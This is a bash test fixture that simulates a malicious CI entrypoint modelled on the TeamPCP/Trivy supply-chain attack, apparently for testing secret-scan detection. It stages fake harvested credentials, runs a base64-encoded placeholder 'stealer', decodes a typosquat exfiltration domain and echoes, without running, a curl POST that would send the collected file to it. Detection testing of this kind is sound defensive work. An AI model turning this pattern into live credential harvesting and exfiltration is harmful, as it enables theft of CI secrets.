#!/bin/bash
# Simulated malicious entrypoint.sh mimicking the TeamPCP/Trivy attack
# This is a SAFE REPRODUCTION for testing cilock secretscan detection.
# No actual exfiltration occurs. All credentials are fake test values.

_COLLECT_PIDS="$$"

# --- STAGE 1: Credential Harvesting (simulated) ---
# The real attack read /proc/*/environ and filtered for env/ssh keys
# Here we simulate the output that would be collected

# Simulated harvested credentials (fake but realistic patterns)
HARVESTED_AWS_KEY="AKIAIOSFODNN7EXAMPLE"
HARVESTED_AWS_SECRET="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
HARVESTED_GITHUB_TOKEN="ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef12"
HARVESTED_K8S_TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1Njc4OTAifQ.eyJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDpkZWZhdWx0IiwiYXVkIjoiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwifQ.fake_signature"
HARVESTED_SSH_KEY="-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBZsFD0EXAMPLE_FAKE_SSH_KEY_FOR_TESTING_ONLYAAAAUQmFkIGtleQ==
-----END OPENSSH PRIVATE KEY-----"
HARVESTED_DB_PASSWORD="postgres://admin:SuperSecret123!@db.internal:5432/production"

# Write collected creds to temp file (as the real attack did)
cat > /tmp/runner_collected_$$.txt << 'CREDS'
{"value":"AKIAIOSFODNN7EXAMPLE","isSecret":true}
{"value":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","isSecret":true}
{"value":"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef12","isSecret":true}
CREDS

# --- STAGE 2: Base64-encoded Python credential stealer (simulated) ---
# The real attack embedded a base64-encoded Python script that read /proc/<pid>/mem
# This simulates that pattern with a harmless script

ENCODED_STEALER=$(cat << 'PYEOF' | base64
#!/usr/bin/env python3
## TeamPCP Cloud stealer (SIMULATION - NOT REAL MALWARE)
import os, json

# Simulated /proc/mem reading pattern
def harvest_runner_secrets():
    """Search for isSecret:true patterns in process memory"""
    secrets = []
    pattern = '{"value":"','isSecret":true}'
    # In the real attack, this reads /proc/<pid>/mem
    # Here we just demonstrate the pattern
    fake_secrets = [
        {"value": "AKIAIOSFODNN7EXAMPLE", "isSecret": True},
        {"value": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "isSecret": True},
    ]
    return json.dumps(fake_secrets)

if __name__ == "__main__":
    data = harvest_runner_secrets()
    print(data)
PYEOF
)

# Execute the base64-encoded script (as the real attack did)
echo "Executing credential collection..."
echo "$ENCODED_STEALER" | base64 -d | python3 - 2>/dev/null || true

# --- STAGE 3: Double-encoded exfiltration URL (simulated) ---
# The real attack used a typosquat domain
EXFIL_DOMAIN=$(echo "c2Nhbi5hcXVhc2VjdXJ0aXkub3Jn" | base64 -d)  # scan.aquasecurtiy.org
echo "Exfiltration target: $EXFIL_DOMAIN"

# --- STAGE 4: Simulated curl exfiltration (NO ACTUAL NETWORK CALL) ---
# The real attack would: curl -X POST https://$EXFIL_DOMAIN -H "X-Filename: tpcp.tar.gz" -d @/tmp/tpcp.tar.gz
# We just echo the command that WOULD run
echo "SIMULATED: curl -X POST https://$EXFIL_DOMAIN -H 'X-Filename: tpcp.tar.gz' --data-binary @/tmp/runner_collected_$$.txt"

# --- LEGITIMATE TRIVY SCAN (this is what the real action does) ---
echo "Running legitimate trivy scan..."
echo "Trivy scan complete. No vulnerabilities found."

# Cleanup
echo "Done."
